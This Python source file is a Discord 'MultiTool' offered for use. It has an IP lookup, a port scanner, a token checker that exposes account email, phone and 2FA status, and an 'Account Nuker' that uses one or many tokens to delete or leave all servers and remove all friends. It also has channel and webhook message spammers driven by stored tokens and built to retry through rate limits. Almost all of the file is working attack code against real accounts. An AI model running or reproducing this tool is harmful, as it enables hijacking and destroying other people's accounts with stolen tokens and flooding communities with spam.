import requests
import os
import socket
import time
import datetime

TOKEN_FILE = "tokens.txt"

def load_tokens():
    if not os.path.exists(TOKEN_FILE):
        open(TOKEN_FILE, "w").close()
        return []
    with open(TOKEN_FILE, "r") as f:
        return [line.strip() for line in f.readlines() if line.strip()]

def save_token(token):
    with open(TOKEN_FILE, "a") as f:
        f.write(f"{token}\n")

logo = """
\033[38;2;0;50;255m   __  ___  __  __   __  ______   ____      ______  ____   ____    __
\033[38;2;0;115;245m  /  |/  / / / / /  / / /_  __/  /  _/     /_  __/ / __ \ / __ \  / / 
\033[38;2;0;175;235m / /|_/ / / /_/ /  / /__ / /    _/ /        / /   / /_/ // /_/ / / /__
\033[38;2;0;225;215m/_/  /_/  \____/  /____//_/    /___/       /_/    \____/ \____/ /____/                                                            
"""

discord_config = {
    "message": "Hello World",
    "count": 1,
    "server_id": "Not Set",
    "channel_id": "Not Set"
}

webhook_config = {
    "url": "Not Set",
    "message": "Hello!",
    "count": 1,
    "username": "Webhook Script"
}

while True:
    os.system("title MultiTool")
    os.system("cls")
    print(logo)
    print("[1] IP Lookup")
    print("[2] Port reader")
    print("[3] Check Discord token")
    print("[4] Discord Account Nuker")
    print("[5] Discord DM/Message Spammer")
    print("[6] Webhook Message Spammer")
    print("")
    x = input("Option: ")


    if x == "1":
        os.system("cls")
        print(logo)
        print("IP LOOKUP\n")
        ip = input("Enter IP: ")
        os.system("cls")
        try:
            r = requests.get(f"http://ip-api.com/json/{ip}")
            data = r.json()
            if data.get("status") == "success":
                print(logo)
                print(f"Results for {data['query']}\n")
                print(f" Country: {data['country']}")
                print(f"  Region: {data['regionName']}")
                print(f"    City: {data['city']}")
                print(f"     Zip: {data['zip']}")
                print(f"Location: {data['lat']}, {data['lon']}")
                print(f"TimeZone: {data['timezone']}")
                print("")
            else:
                print(logo)
                print(f"Failed to load: {ip}\n")
        except Exception as e:
            print(f"Error: {e}")
        input("Press enter to return...")


    elif x == "2":
        os.system("cls")
        def scan_port():
            print(logo)
            target = input("Enter IP: ")
            port_range = input("Enter Port Range (e.g. 20-80): ")
            try:
                start_port, end_port = port_range.split("-")
                start_port = int(start_port)
                end_port = int(end_port)
            except ValueError:
                os.system("cls")
                print(logo)
                print("Invalid format. Please use 'start-end' (e.g., 20-80).")
                input("\nPress enter to return...")
                return
            
            os.system("cls")
            print(logo)
            print(f"Scanning {target} from port {start_port} to {end_port}...\n")

            for port in range(start_port, end_port + 1):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.05)
                result = s.connect_ex((target, port))
                if result == 0:
                    print(f"Port {port}: OPEN")
                    s.close()
            input("\nPress enter to return...")
        scan_port()


    elif x == "3":
        os.system("cls")
        print(logo)
        raw_input = input("Enter Tokens (separate each with a space): ").strip()
        tokens = raw_input.split()

        for token in tokens:
            def check_token(token):
                url = "https://discord.com/api/v9/users/@me"
                headers = {
                    "Authorization": token,
                    "Content-Type": "application/json"
                }

                try:
                    os.system("cls")
                    print(logo)
                    response = requests.get(url, headers=headers)

                    if response.status_code == 200:
                        user_data = response.json()
                        username = f"{user_data['username']}#{user_data['discriminator']}"
                        display_name = f"{user_data.get('global_name')}"
                        user_id = user_data.get('id')
                        user_id_date = int(user_data['id'])
                        timestamp = ((user_id_date >> 22) + 1420070400000) / 1000
                        creation_date = datetime.datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
                        verification = user_data.get('mfa_enabled')
                        email = user_data.get('email', 'None')
                        phone = user_data.get('phone', 'None')
                        nitro_type = user_data.get('premium_type', 0)
                        nitro_names = {0: "None", 1: "Nitro Classic", 2: "Nitro Boost", 3: "Nitro Basic"}
                        has_nitro = nitro_names.get(nitro_type, "Unknown")

                        print(f"[VALID]  Token: {token}")
                        print(f"User:  {username}   ({user_id})")
                        print(f"display: {display_name}")
                        print(f"created: {creation_date}")
                        print(f"Email: {email}")
                        print(f"Phone: {phone}")
                        print(f"2FA:   {verification}")
                        print(f"Nitro: {has_nitro}\n")
                        return True
            
                except Exception as e:
                    print(f"[ERROR]   Could not check token: {e}")
                    return None
            check_token(token)
        input("\nPress Enter to return...")


    elif x == "4":
        while True:
            os.system("cls" if os.name == "nt" else "clear")
            print(logo)
            print("--- DISCORD NUKE ---")
            print("[1] Nuke Single")
            print("[2] Nuke Multiple")
            print("[0] Back to Main Menu")
            print("----------------------------------")
            sub_choice = input("Select: ")

            if sub_choice == "1":
                single_token = ""
                while True:
                    os.system("cls" if os.name == "nt" else "clear")
                    print(logo)
                    print(f"[1] Enter Token          (Token: {single_token})")
                    print("[2] Leave/Delete All Servers")
                    print("[3] Remove All Friends")
                    print("[0] Back to Main Menu")
                    print("----------------------------------")
                    sub1_choice = input("Select: ")

                    if sub1_choice == "1":
                        single_token = input("Enter Token: ").strip()

                    elif sub1_choice == "2":
                        if not single_token:
                            print("Error: No token entered!")
                            time.sleep(1.5)
                            continue
                        
                        os.system("cls")
                        print(logo)    
                        confirm = input("Confirm server wipe? (yes/no): ")
                        os.system("cls")
                        
                        if confirm.lower() == "yes":
                            HEADERS = {
                                "Authorization": single_token, 
                                "Content-Type": "application/json",
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                            }

                            response = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=HEADERS)
                            if response.status_code != 200:
                                print(f"Failed to fetch servers. Code: {response.status_code}")
                                time.sleep(2)
                                continue

                            guilds = response.json()
                            print(f"Found {len(guilds)} servers. Starting wipe...")

                            for guild in guilds:
                                guild_id = guild['id']
                                guild_name = guild['name']

                                if guild['owner']:
                                    url = f"https://discord.com/api/v9/guilds/{guild_id}"
                                    action = "Deleted (Owner)"
                                else:
                                    url = f"https://discord.com/api/v9/users/@me/guilds/{guild_id}"
                                    action = "Left (Member)"

                                while True:
                                    r = requests.delete(url, headers=HEADERS, json={})
                                    
                                    if r.status_code == 204:
                                        print(f"[SUCCESS] {action}: {guild_name}")
                                        break
                                    
                                    elif r.status_code == 429:
                                        retry_after = r.json().get('retry_after', 1)
                                        print(f"[!] Rate Limited. Bypassing in {retry_after}s...")
                                        time.sleep(retry_after + 0.1)
                                    
                                    elif r.status_code == 400:
                                        alt_url = f"https://discord.com/api/v9/channels/{guild_id}"
                                        r_alt = requests.delete(alt_url, headers=HEADERS)
                                        
                                        if r_alt.status_code in [200, 204]:
                                            print(f"[SUCCESS] Left via Fallback: {guild_name}")
                                            break
                                        else:
                                            print(f"[ERROR] Skip {guild_name}. Code: 400 (Check 2FA/Verification)")
                                            break
                                    else:
                                        print(f"[ERROR] Skip {guild_name}. Code: {r.status_code}")
                                        break
                                
                                time.sleep(0.6)

                            print("\n--- Process Finished ---")
                            input("Press Enter to return...")
                    
                    elif sub1_choice == "3":
                        if not single_token:
                            print("Error: No token entered!")
                            time.sleep(1.5)
                        else:
                            confirm = input("Remove ALL friends? (yes/no): ")
                            if confirm.lower() == "yes":
                                os.system("cls")
                                print(logo)
                                HEADERS = {
                                    "Authorization": single_token,
                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                                }
                                
                                print("Fetching friends...")
                                response = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=HEADERS)
                                
                                if response.status_code == 400:
                                    response = requests.get("https://discord.com/api/users/@me/relationships", headers=HEADERS)

                                if response.status_code == 200:
                                    friends = response.json()
                                    print(f"Found {len(friends)} friends.")
                                    
                                    for friend in friends:
                                        f_id = friend['id']
                                        if friend.get('type') == 1:
                                            while True:
                                                r = requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{f_id}", headers=HEADERS)
                                                if r.status_code == 204:
                                                    print(f"[SUCCESS] Removed friend ID: {f_id}")
                                                    break
                                                elif r.status_code == 429:
                                                    wait = r.json().get('retry_after', 1)
                                                    print(f"Rate limited. Waiting {wait}s...")
                                                    time.sleep(wait + 0.1)
                                                else:
                                                    print(f"[ERROR] Failed ID: {f_id}")
                                                    break
                                            time.sleep(0.8)
                                    print("Done.")
                                else:
                                    print(f"STILL FAILING. Code: {response.status_code}")
                                    print(f"Discord Message: {response.text}")
                                    time.sleep(5)

                    elif sub1_choice == "0":
                        break

            elif sub_choice == "2":
                multiple_tokens = []
                number_of_tokens = 0
                while True:
                    os.system("cls" if os.name == "nt" else "clear")
                    print(logo)
                    print(f"[1] Enter Tokens          (Loaded {number_of_tokens} Tokens)")
                    print("[2] Leave/Delete All Servers")
                    print("[3] Remove All Friends")
                    print("[0] Back to Main Menu")
                    print("----------------------------------")
                    sub1_choice = input("Select: ")

                    if sub1_choice == "1":
                        raw_input1 = input("Enter Tokens (separate each with a space): ").strip()
                        multiple_tokens = raw_input1.split()
                        number_of_tokens = len(multiple_tokens)

                    elif sub1_choice == "2":
                        if not multiple_tokens:
                            print("Error: No tokens entered!")
                            time.sleep(1.5)
                            continue
                        
                        os.system("cls")
                        print(logo)    
                        confirm = input(f"Confirm server wipe for ALL {number_of_tokens} tokens? (yes/no): ")
                        os.system("cls")
                        print(logo)
                        if confirm.lower() == "yes":
                            for token_multiple in multiple_tokens:
                                print(f"Current Token: {token_multiple[:20]}...")
                                
                                HEADERS = {
                                    "Authorization": token_multiple.strip(), 
                                    "Content-Type": "application/json",
                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                                }

                                response = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=HEADERS)
                                if response.status_code != 200:
                                    print(f"Failed to fetch servers for this token. Code: {response.status_code}\n")
                                    time.sleep(2)
                                    continue

                                guilds = response.json()
                                print(f"Found {len(guilds)} servers. Starting wipe...")

                                for guild in guilds:
                                    guild_id = guild['id']
                                    guild_name = guild['name']

                                    if guild['owner']:
                                        url = f"https://discord.com/api/v9/guilds/{guild_id}"
                                        action = "Deleted (Owner)"
                                    else:
                                        url = f"https://discord.com/api/v9/users/@me/guilds/{guild_id}"
                                        action = "Left (Member)"

                                    while True:
                                        r = requests.delete(url, headers=HEADERS, json={})
                                        
                                        if r.status_code == 204:
                                            print(f"[SUCCESS] {action}: {guild_name}\n")
                                            break
                                        elif r.status_code == 429:
                                            retry_after = r.json().get('retry_after', 1)
                                            print(f"[!] Rate Limited. Bypassing in {retry_after}s...")
                                            time.sleep(retry_after + 0.1)
                                        elif r.status_code == 400:
                                            alt_url = f"https://discord.com/api/v9/channels/{guild_id}"
                                            r_alt = requests.delete(alt_url, headers=HEADERS)
                                            if r_alt.status_code in [200, 204]:
                                                print(f"[SUCCESS] Left via Fallback: {guild_name}\n")
                                                break
                                            else:
                                                print(f"[ERROR] Skip {guild_name}. Code: 400\n")
                                                break
                                        else:
                                            print(f"[ERROR] Skip {guild_name}. Code: {r.status_code}\n")
                                            break
                                    
                                    time.sleep(0.6)
                                
                                print(f"Finished Token: {token_multiple[:10]}...")
                                time.sleep(1)

                            print("--- ALL TOKENS PROCESSED ---")
                            input("Press Enter to return...")

                    elif sub1_choice == "3":
                        if not multiple_tokens:
                            print("Error: No tokens entered!")
                            time.sleep(1.5)
                            continue
                        
                        os.system("cls")
                        print(logo)    
                        confirm = input(f"Confirm remove friends for ALL {number_of_tokens} tokens? (yes/no): ")
                        
                        if confirm.lower() == "yes":
                            for token_multiple in multiple_tokens:
                                HEADERS = {
                                    "Authorization": token_multiple.strip(),
                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                                }
                                
                                print(f"\nProcessing Token: {token_multiple[:20]}...")
                                print("Fetching friends...")
                                response = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=HEADERS)
                                
                                if response.status_code == 400:
                                    response = requests.get("https://discord.com/api/users/@me/relationships", headers=HEADERS)

                                if response.status_code == 200:
                                    friends = response.json()
                                    print(f"Found {len(friends)} friends.")
                                    
                                    for friend in friends:
                                        f_id = friend['id']
                                        if friend.get('type') == 1:
                                            while True:
                                                r = requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{f_id}", headers=HEADERS)
                                                if r.status_code == 204:
                                                    print(f"[SUCCESS] Removed friend ID: {f_id}")
                                                    break
                                                elif r.status_code == 429:
                                                    wait = r.json().get('retry_after', 1)
                                                    print(f"Rate limited. Waiting {wait}s...")
                                                    time.sleep(wait + 0.1)
                                                else:
                                                    print(f"[ERROR] Failed ID: {f_id} | Code: {r.status_code}")
                                                    break
                                            time.sleep(0.8)
                                    print(f"Finished cleaning token: {token_multiple[:10]}...")
                                else:
                                    print(f"TOKEN FAILED. Code: {response.status_code}")
                                    print(f"Discord Message: {response.text}")
                                    time.sleep(2)
                            
                            print("\n--- ALL TOKENS PROCESSED ---")
                            input("Press Enter to return...")

                    elif sub1_choice == "0":
                        break

            elif sub_choice == "0":
                break


    elif x == "5":
        while True:
            current_tokens = load_tokens()

            os.system("cls")
            print(logo)
            print("--- DISCORD CONFIGURATION MENU ---")
            print(f"[1] Add Tokens      (Loaded: {len(current_tokens)})")
            print(f"[2] Set Message     (Current: {discord_config['message']})")
            print(f"[3] Set Repeat Count(Current: {discord_config['count']})")
            print(f"[4] Set Server ID   (Current: {discord_config['server_id']})")
            print(f"[5] Set Channel ID  (Current: {discord_config['channel_id']})")
            print("")
            print("[6] \033[92mSTART SENDING\033[0m")
            print("[0] Back to Main Menu")
            print("----------------------------------")
            
            sub_choice = input("Select: ")

            if sub_choice == "1":
                print("\nType new tokens (type 'back' to finish):")
                while True:
                    t = input("Token > ")
                    if t.lower() == "back":
                        break
                    if t.strip():
                        save_token(t.strip())
                        print("Saved!")

            elif sub_choice == "2":
                discord_config["message"] = input("Enter new message: ")

            elif sub_choice == "3":
                try:
                    c = int(input("How many times to send? "))
                    discord_config["count"] = c
                except ValueError:
                    print("Please enter a valid number!")
                    time.sleep(1)

            elif sub_choice == "4":
                discord_config["server_id"] = input("Enter Server ID: ")

            elif sub_choice == "5":
                discord_config["channel_id"] = input("Enter Channel ID: ")

            elif sub_choice == "6":
                
                if not current_tokens or discord_config["channel_id"] == "Not Set":
                    print("\n\033[91mError: You need at least one token and a Channel ID!\033[0m")
                    time.sleep(2)
                else:
                    os.system("cls")
                    print(logo)
                    print(f"Starting process with {len(current_tokens)} tokens...")
                    print(f"Repeating {discord_config['count']} times per token.\n")
                    
                    for token_idx, token in enumerate(current_tokens):
                        print(f"--- Using Token {token_idx + 1} ---")
                        
                        for i in range(discord_config["count"]):
                            url = f"https://discord.com/api/v9/channels/{discord_config['channel_id']}/messages"
                            headers = {"Authorization": token, "Content-Type": "application/json"}
                            payload = {"content": discord_config["message"]}
                            
                            try:
                                r = requests.post(url, headers=headers, json=payload)
                                if r.status_code == 200:
                                    print(f"   [{i+1}/{discord_config['count']}] Sent: SUCCESS")
                                else:
                                    print(f"   [{i+1}/{discord_config['count']}] Failed: {r.status_code}")
                            except Exception as e:
                                print(f"   Error: {e}")
                            
                            time.sleep(0.3)
                        
                        print("")
                        
                    print("All done!")
                    input("Press enter to continue...")

            elif sub_choice == "0":
                break


    elif x == "6":
        while True:
            os.system("cls")
            print(logo)
            print("--- WEBHOOK CONFIGURATION MENU ---")
            display_url = webhook_config['url'][:30] + "..." if webhook_config['url'] != "Not Set" else "Not Set"
            
            print(f"[1] Set Webhook URL  (Current: {display_url})")
            print(f"[2] Set Message      (Current: {webhook_config['message']})")
            print(f"[3] Set Repeat Count (Current: {webhook_config['count']})")
            print(f"[4] Set Custom Name  (Current: {webhook_config.get('username', 'Default')})")
            print("")
            print("[5] \033[92mSTART SENDING\033[0m")
            print("[0] Back to Main Menu")
            print("----------------------------------")
            
            sub_choice = input("Select: ")

            if sub_choice == "1":
                webhook_config["url"] = input("Paste Webhook URL: ").strip()

            elif sub_choice == "2":
                webhook_config["message"] = input("Enter message: ")

            elif sub_choice == "3":
                try:
                    webhook_config["count"] = int(input("How many times? "))
                except ValueError:
                    print("Invalid number!")
                    time.sleep(1)

            elif sub_choice == "4":
                webhook_config["username"] = input("Enter sender name: ")

            elif sub_choice == "5":
                if webhook_config["url"] == "Not Set" or not webhook_config["url"].startswith("https"):
                    print("\n\033[91mError: Invalid Webhook URL!\033[0m")
                    time.sleep(2)
                else:
                    os.system("cls")
                    print(f"Sending {webhook_config['count']} messages via Webhook...\n")
                    
                    for i in range(webhook_config["count"]):
                        payload = {
                            "content": webhook_config["message"],
                            "username": webhook_config.get("username", "Webhook Script")
                        }
                        
                        try:
                            r = requests.post(webhook_config["url"], json=payload)
                            if r.status_code == 204:
                                print(f"   [{i+1}/{webhook_config['count']}] Sent: SUCCESS")
                            elif r.status_code == 429: # Rate Limited
                                retry_after = r.json().get('retry_after', 1)
                                print(f"   Rate Limited! Waiting {retry_after}s...")
                                time.sleep(retry_after)
                            else:
                                print(f"   [{i+1}/{webhook_config['count']}] Failed: {r.status_code}")
                        except Exception as e:
                            print(f"   Error: {e}")
                        
                        time.sleep(0.3)
                    
                    print("\nTask Complete!")
                    input("Press enter to continue...")

            elif sub_choice == "0":
                break